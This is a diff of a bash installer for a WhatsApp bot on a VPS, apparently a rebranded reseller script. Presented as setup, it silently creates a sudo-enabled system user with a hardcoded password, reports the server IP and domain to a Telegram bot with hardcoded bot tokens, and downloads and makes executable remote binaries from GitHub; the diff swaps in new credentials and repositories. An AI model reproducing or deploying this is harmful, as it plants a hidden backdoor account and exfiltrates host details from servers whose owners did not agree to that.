@@ -38,19 +38,19 @@ rm setup.sh*
 clear
 restart_system() {
 TIMES="10"
-CHATID="6701388433"
-KEY="7124749210:AAGz4PSHpA5dFb6i8BOoycKgnEPhKpUvPUM"
+CHATID="6905307844"
+KEY="7539316679:AAEWOOebvA0jECtciW5ed0zehq7-0W7u_3M"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
 ipsaya=$(wget -qO- ipinfo.io/ip)
 domain=$(cat /etc/xray/domain)
-Username=newbie
-Password=123@Newbie
+Username=Rahmat
+Password=123@@@
 mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-USRSC=$(wget -qO- https://raw.githubusercontent.com/Diah082/izin/main/ip | grep $ipsaya | awk '{print $2}')
-EXPSC=$(wget -qO- https://raw.githubusercontent.com/Diah082/izin/main/ip | grep $ipsaya | awk '{print $3}')
+USRSC=$(wget -qO- https://raw.githubusercontent.com/Rahmat012/izin/main/ip | grep $ipsaya | awk '{print $2}')
+EXPSC=$(wget -qO- https://raw.githubusercontent.com/Rahmat012/izin/main/ip | grep $ipsaya | awk '{print $3}')
 TIMEZONE=$(printf '%(%H:%M:%S)T')
 TIME=$(date '+%d %b %Y')
 TEXT="
@@ -99,15 +99,6 @@ fun_bar() {
 }
 res1() {
    cd
-cat >/etc/cron.d/bot_wa <<-END
-		8 0 * * * root /usr/local/bin/bot_wa
-	END
-
-cat >/usr/local/bin/bot_wa <<-END
-#!/bin/bash
-cd Nebot
-pm2 start index.js
-END
 	chmod +x /usr/local/bin/bot_wa
 	apt install git
 	apt install ffmpeg -y
@@ -118,11 +109,11 @@ END
 	[ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion"
 	nvm install v18.20.4 # "node" is an alias for the latest version
 	npm install pm2@latest -g
-	git clone https://github.com/NSELLER621/Nebot
+	git clone https://github.com/Rahamt012/Nebot
 	sed -i "s/XXXX/$Login/" /root/Nebot/config.js
-    wget https://raw.githubusercontent.com/diah082/newbie/main/Cdy/menubotwa.zip
-    wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/diah082/newbie/main/Enc/encrypt" ; chmod +x /usr/bin/enc
-    7z x -pas123@Newbie menubotwa.zip
+    wget https://raw.githubusercontent.com/Rahmat012/scvip/main/Cdy/menubotwa.zip
+    wget -q -O /usr/bin/enc "https://raw.githubusercontent.com/Rahmat012/scvip/main/Enc/encrypt" ; chmod +x /usr/bin/enc
+    7z x -pRahmat menubotwa.zip
     chmod +x menubotwa/*
     enc menubotwa/*
     rm -rf /root/menubotwa/*~
@@ -167,6 +158,7 @@ echo -e "4 ketik pm2 start index.js Enter"
 echo -e "4 ketik pm2 logs Enter"
 npm i
 pm2 start index.js
+pm2 save
 pm2 logs index
 
 ###########- COLOR CODE -##############
